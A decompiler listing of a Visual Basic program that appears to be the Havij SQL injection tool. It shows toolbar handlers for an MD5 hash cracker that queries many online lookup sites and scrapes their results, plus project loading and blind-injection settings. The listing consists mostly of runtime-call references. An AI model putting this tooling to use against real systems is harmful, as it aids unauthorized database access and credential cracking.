'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFPException
'N  * ref: __vbaErrorOverflow
End Sub
 
Sub Toolbar5_ButtonClick(ByVal Button As MSComctlLib.Button)
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaChkstk
'N  * ref: __vbaObjSetAddref
'N  * ref: __vbaOnError
'N  * ref: __vbaHresultCheckObj
'N  * ref: Trim(
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeVar
'N  * ref: "Start"
'N  * ref: __vbaVarTstEq
'N  * ref: "  Stop  "
'N  * ref: __vbaHresultCheckObj
'N  * ref: "stop"
'N  * ref: __vbaChkstk
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaStrCopy
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObj
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObj
'N  * ref: __vbaStrCopy
'N  * ref: "Cracking hash: "
'N  * ref: __vbaStrCat
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: "Looking for hash..."
'N  * ref: __vbaVarDup
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCall
'N  * ref: __vbaFreeObj
'N  * ref: __vbaChkstk
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdSt
'N  * ref: __vbaFreeObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaVarDup
'N  * ref: IIf(
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaStrMove
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaRedim
'N  * ref: __vbaRedim
'N  * ref: __vbaRedim
'N  * ref: __vbaRedim
'N  * ref: __vbaRedim
'N  * ref: "http://md5.rednoize.com/?p&s=md5&q="
'N  * ref: __vbaStrCat
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeVar
'N  * ref: "http://gdataonline.com/seekhash.php"
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaVarCopy
'N  * ref: "http://md5decryption.com/"
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaVarCopy
'N  * ref: "http://alimamed.pp.ru/md5/?md5e=&md5d="
'N  * ref: __vbaStrCat
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeVar
'N  * ref: "http://passcracking.com/index.php"
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaVarCopy
'N  * ref: "http://md5.hashcracking.com/search.php?md5="
'N  * ref: __vbaStrCat
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeVar
'N  * ref: "http://www.hashchecker.com/index.php?_sls=search_hash"
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaVarCopy
'N  * ref: "http://www.bigtrapeze.com/md5/"
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaVarCopy
'N  * ref: "http://opencrack.hashkiller.com/"
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaVarCopy
'N  * ref: "http://md5crack.com/crackmd5.php"
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaVarCopy
'N  * ref: "http://www.hashchecker.de/hash.cgi?action=check&wert=1&hash="
'N  * ref: __vbaStrCat
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeVar
'N  * ref: "http://md5hashcracker.appspot.com/crack"
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaVarCopy
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaStrCopy
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaGenerateBoundsError
'N  * ref: "code=02ea015ece83a15cffd9281d53666252&hash="
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrCopy
'N  * ref: __vbaFreeStr
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaGenerateBoundsError
'N  * ref: "hash="
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrMove
'N  * ref: "&submit=Decrypt+It!"
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrCopy
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaStrCopy
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaGenerateBoundsError
'N  * ref: "admin=false&admin2=77.php&datafromuser="
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrCopy
'N  * ref: __vbaFreeStr
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaStrCopy
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaGenerateBoundsError
'N  * ref: "search_field="
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrMove
'N  * ref: "&Submit=search"
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrCopy
'N  * ref: __vbaFreeStrList
'N  * ref: "query="
'N  * ref: LCase(
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaVarCat
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrCopy
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaGenerateBoundsError
'N  * ref: "oc_check_md5="
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrMove
'N  * ref: "&oc_submit=Search+MD5"
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrCopy
'N  * ref: __vbaFreeStrList
'N  * ref: "term="
'N  * ref: LCase(
'N  * ref: "&crackbtn=Crack that hash baby%21"
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaVarCat
'N  * ref: __vbaVarCat
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrCopy
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaStrCopy
'N  * ref: "query="
'N  * ref: LCase(
'N  * ref: "&submit=Crack"
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaVarCat
'N  * ref: __vbaVarCat
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrCopy
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeVarList
'N  * ref: "*"
'N  * ref: vbCrLf
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrMove
'N  * ref: "(*)"
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrMove
'N  * ref: vbCrLf
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrMove
'N  * ref: "*"
'N  * ref: __vbaStrCat
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeVar
'N  * ref: "*</td><td width=" & """" & "35%" & """" & "><b>(*)</b></td>*"
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaVarCopy
'N  * ref: "*<br/><br/><b><font size='2'>Decrypted Text: </b>(*)</font><br/><center>*"
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaVarCopy
'N  * ref: "*MD5 ?à??èô?îâà?: <b>(*)</b><br>*"
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaVarCopy
'N  * ref: "*</td><td>"
'N  * ref: LCase(
'N  * ref: "</td><td bgcolor=#FF0000>(*)</td><td>*"
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaVarCat
'N  * ref: __vbaVarCat
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeVarList
'N  * ref: "*Cleartext of "
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrMove
'N  * ref: " is (firstline*)*"
'N  * ref: __vbaStrCat
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeVar
'N  * ref: "*<li>"
'N  * ref: LCase(
'N  * ref: " is <b>(*)</b> used charlist*"
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaVarCat
'N  * ref: __vbaVarCat
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeVarList
'N  * ref: "*The hash <strong>"
'N  * ref: LCase(
'N  * ref: "</strong> has been deciphered to: <strong>(char*)</strong>*"
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaVarCat
'N  * ref: __vbaVarCat
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeVarList
'N  * ref: "*<div class=" & """" & "result" & """" & ">"
'N  * ref: LCase(
'N  * ref: ":(char*)<br/>*"
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaVarCat
'N  * ref: __vbaVarCat
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeVarList
'N  * ref: "*Found: md5(" & """" & "(*)" & """" & ") = "
'N  * ref: LCase(
'N  * ref: "*"
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaVarCat
'N  * ref: __vbaVarCat
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeVarList
'N  * ref: "*<script>postnext1('*','(*)')</script>*"
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaVarCopy
'N  * ref: "<td id=" & """" & "pla_"
'N  * ref: LCase(
'N  * ref: """" & ">(*)</td>"
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaVarCat
'N  * ref: __vbaVarCat
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaLateIdCall
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaUbound
'N  * ref: __vbaVarForInit
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: __vbaI2Var
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaVarForNext
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaVarForInit
'N  * ref: __vbaFreeObj
'N  * ref: __vbaObjSet
'N  * ref: __vbaI2Var
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaChkstk
'N  * ref: __vbaLateIdSt
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaObjSet
'N  * ref: __vbaI2Var
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaLateIdCall
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaAryLock
'N  * ref: __vbaI4Var
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaGenerateBoundsError
'N  * ref: Subr_135
'N  * ref: __vbaStrMove
'N  * ref: __vbaAryUnlock
'N  * ref: __vbaVarMove
'N  * ref: __vbaStrVarCopy
'N  * ref: __vbaChkstk
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCall
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVar
'N  * ref: __vbaI4Var
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaGenerateBoundsError
'N  * ref: __vbaStrCopy
'N  * ref: __vbaVarAdd
'N  * ref: __vbaI4Var
'N  * ref: "Connecting..."
'N  * ref: __vbaChkstk
'N  * ref: __vbaChkstk
'N  * ref: __vbaChkstk
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallSt
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVar
'N  * ref: __vbaObjSet
'N  * ref: __vbaI2Var
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaChkstk
'N  * ref: __vbaChkstk
'N  * ref: __vbaLateIdCall
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaVarForNext
'N  * ref: Timer
'N  * ref: __vbaVarMove
'N  * ref: Timer
'N  * ref: __vbaVarSub
'N  * ref: __vbaVarTstGt
'N  * ref: __vbaVarMove
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaVarForInit
'N  * ref: __vbaFreeObj
'N  * ref: __vbaObjSet
'N  * ref: __vbaI2Var
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaObjSet
'N  * ref: __vbaI2Var
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaI2Var
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaStrMove
'N  * ref: __vbaStrCmp
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaVarMove
'N  * ref: __vbaVarForNext
'N  * ref: DoEvents
'N  * ref: __vbaVarTstEq
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaVarForInit
'N  * ref: __vbaFreeObj
'N  * ref: Timer
'N  * ref: __vbaObjSet
'N  * ref: __vbaI2Var
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaI2Var
'N  * ref: __vbaVarSub
'N  * ref: __vbaVarCmpGt
'N  * ref: __vbaVarOr
'N  * ref: __vbaVarAnd
'N  * ref: __vbaBoolVarNull
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaObjSet
'N  * ref: __vbaI2Var
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaLateIdCall
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaI2Var
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaObjSet
'N  * ref: __vbaI2Var
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaChkstk
'N  * ref: __vbaLateIdSt
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaI4Var
'N  * ref: __vbaI4Var
'N  * ref: __vbaChkstk
'N  * ref: __vbaChkstk
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaStrMove
'N  * ref: "Failed"
'N  * ref: __vbaStrCmp
'N  * ref: __vbaChkstk
'N  * ref: __vbaChkstk
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaStrMove
'N  * ref: "Requesting"
'N  * ref: __vbaStrCmp
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: Timer
'N  * ref: __vbaI4Var
'N  * ref: "Canceled"
'N  * ref: __vbaVarDup
'N  * ref: "Timed Out!"
'N  * ref: __vbaVarDup
'N  * ref: __vbaVarSub
'N  * ref: __vbaVarCmpGt
'N  * ref: __vbaVarMove
'N  * ref: IIf(
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaChkstk
'N  * ref: __vbaChkstk
'N  * ref: __vbaChkstk
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdCallSt
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaNew2
'N  * ref: __vbaObjSet
'N  * ref: __vbaI2Var
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaVarForNext
'N  * ref: __vbaStrCmp
'N  * ref: __vbaVarDup
'N  * ref: "Job Canceled! "
'N  * ref: __vbaVarDup
'N  * ref: IIf(
'N  * ref: "Plain text of "
'N  * ref: " is "
'N  * ref: __vbaVarCat
'N  * ref: __vbaVarCat
'N  * ref: __vbaVarCat
'N  * ref: __vbaVarCat
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaVarDup
'N  * ref: "Job Canceled! "
'N  * ref: __vbaVarDup
'N  * ref: IIf(
'N  * ref: "Plain text not found!"
'N  * ref: __vbaVarCat
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: "  Start  "
'N  * ref: __vbaHresultCheckObj
'N  * ref: "go"
'N  * ref: __vbaChkstk
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: "Stop"
'N  * ref: __vbaVarTstEq
'N  * ref: __vbaHresultCheckObj
'N  * ref: "Canceling..."
'N  * ref: __vbaVarDup
'N  * ref: Subr_143
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaAryUnlock
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVar
End Sub
 
Sub Toolbar6_ButtonClick(ByVal Button As MSComctlLib.Button)
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaObjSetAddref
'N  * ref: __vbaOnError
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaStrMove
'N  * ref: "Load"
'N  * ref: __vbaStrCmp
'N  * ref: "Stop current job first!"
'N  * ref: __vbaVarDup
'N  * ref: MsgBox
'N  * ref: __vbaFreeVarList
'N  * ref: "Havij Injection Project (*.hvj)|*.hvj"
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdSt
'N  * ref: __vbaFreeObj
'N  * ref: __vbaLateIdSt
'N  * ref: __vbaLateIdCall
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaStrMove
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeVar
'N  * ref: "Save"
'N  * ref: "Havij Injection Project (*.hvj)|*.hvj"
'N  * ref: __vbaObjSet
'N  * ref: __vbaLateIdSt
'N  * ref: __vbaFreeObj
'N  * ref: __vbaLateIdSt
'N  * ref: __vbaLateIdCall
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaStrVarMove
'N  * ref: Subr_133
'N  * ref: __vbaFreeVarList
'N  * ref: "File already exists."
'N  * ref: vbCrLf
'N  * ref: __vbaStrCat
'N  * ref: __vbaStrMove
'N  * ref: "Do you want to overwrite?"
'N  * ref: __vbaStrCat
'N  * ref: MsgBox
'N  * ref: __vbaVarMove
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaVarTstEq
'N  * ref: __vbaObjSetAddref
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaLateIdCallLd
'N  * ref: __vbaStrVarMove
'N  * ref: __vbaStrMove
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaExitProc
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFreeObj
End Sub
 
Sub Toolbar7_ButtonClick(ByVal Button As MSComctlLib.Button)
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaObjSetAddref
'N  * ref: __vbaVarDup
'N  * ref: "Please register to activate!"
'N  * ref: Subr_143
'N  * ref: __vbaUI1Var
'N  * ref: __vbaFreeVarList
'N  * ref: "Please register to activate"
'N  * ref: MsgBox
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaFreeObj
End Sub
 
Sub Toolbar8_ButtonClick(ByVal Button As MSComctlLib.Button)
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaObjSetAddref
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeObj
End Sub
 
Sub Toolbar9_ButtonClick(ByVal Button As MSComctlLib.Button)
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaObjSetAddref
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeObj
End Sub
 
Sub txtBlindMaxChar_KeyDown(KeyCode As Integer, Shift As Integer)
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaObjSet
'N  * ref: __vbaStrI2
'N  * ref: __vbaStrMove
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObj
End Sub
 
Sub txtBlindMaxChar_KeyPress(KeyAscii As Integer)
'N  * ref: __vbaExceptHandler
'N  * ref: Chr(
'N  * ref: IsNumeric(
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFreeVar
End Sub
 
Sub txtBlindMaxChar_LostFocus()
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObj
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: Val(
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: Val(
'N  * ref: __vbaFpR8
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: Val(
'N  * ref: __vbaFpR8
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: Val(
'N  * ref: __vbaFpR8
'N  * ref: __vbaFpR8
'N  * ref: IsNumeric(
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVar
'N  * ref: "Invalid input! End char must be between 0 to 255 and greater or equal to Start char."
'N  * ref: __vbaVarDup
'N  * ref: MsgBox
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: "1"
'N  * ref: __vbaStrCmp
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
End Sub
 
Sub txtBlindMinChar_GotFocus()
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaObjSet
'N  * ref: __vbaStrI2
'N  * ref: __vbaStrMove
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObj
End Sub
 
Sub txtBlindMinChar_KeyPress(KeyAscii As Integer)
'N  * ref: __vbaExceptHandler
'N  * ref: Chr(
'N  * ref: IsNumeric(
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFreeVar
End Sub
 
Sub txtBlindMinChar_LostFocus()
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: Val(
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: Val(
'N  * ref: __vbaFpR8
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: Val(
'N  * ref: __vbaFpR8
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: Val(
'N  * ref: __vbaFpR8
'N  * ref: __vbaFpR8
'N  * ref: IsNumeric(
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVar
'N  * ref: "Invalid input! Start char must be between 0 to 255 and less or equal to End char."
'N  * ref: __vbaVarDup
'N  * ref: MsgBox
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: "1"
'N  * ref: __vbaStrCmp
'N  * ref: __vbaFreeStr
'N  * ref: __vbaFreeObj
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
End Sub
 
Sub txtHeaders_LostFocus()
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaStrCat
'N  * ref: vbCrLf
'N  * ref: vbCrLf
'N  * ref: __vbaInStrVar
'N  * ref: __vbaVarTstGt
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaObjSet
'N  * ref: vbCrLf
'N  * ref: vbCrLf
'N  * ref: vbCrLf
'N  * ref: __vbaStrMove
'N  * ref: Replace(
'N  * ref: __vbaStrMove
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaStrCat
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: Subr_186
'N  * ref: __vbaStrMove
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
End Sub
 
Sub txtMaxColCount_KeyPress(KeyAscii As Integer)
'N  * ref: __vbaExceptHandler
'N  * ref: Chr(
'N  * ref: IsNumeric(
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFreeVar
End Sub
 
Sub txtMaxColCount_LostFocus()
'N  * ref: __vbaExceptHandler
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: Val(
'N  * ref: __vbaFpR8
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: Val(
'N  * ref: __vbaFpR8
'N  * ref: IsNumeric(
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVar
'N  * ref: "Invalid input! Max column count can be between 1 to 2000"
'N  * ref: __vbaVarDup
'N  * ref: MsgBox
'N  * ref: __vbaFreeVarList
'N  * ref: __vbaObjSet
'N  * ref: __vbaHresultCheckObj
'N  * ref: __vbaFreeObj
'N  * ref: __vbaFreeStrList
'N  * ref: __vbaFreeObjList
'N  * ref: __vbaFreeVarList
End Sub
 
Sub txtProxyPort_KeyPress(KeyAscii As Integer)
'N  * ref: __vbaExceptHandler
'N  * ref: Chr(
'N  * ref: IsNumeric(
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFreeVar
End Sub
 
Sub txtRetry_KeyPress(KeyAscii As Integer)
'N  * ref: __vbaExceptHandler
'N  * ref: Chr(
'N  * ref: IsNumeric(
'N  * ref: __vbaFreeVar
'N  * ref: __vbaFreeVar
End Sub
 
Sub txtStartColCount_KeyPress(KeyAscii As Integer)
'N  * ref: __vbaExceptHandler
'N  * ref: Chr(
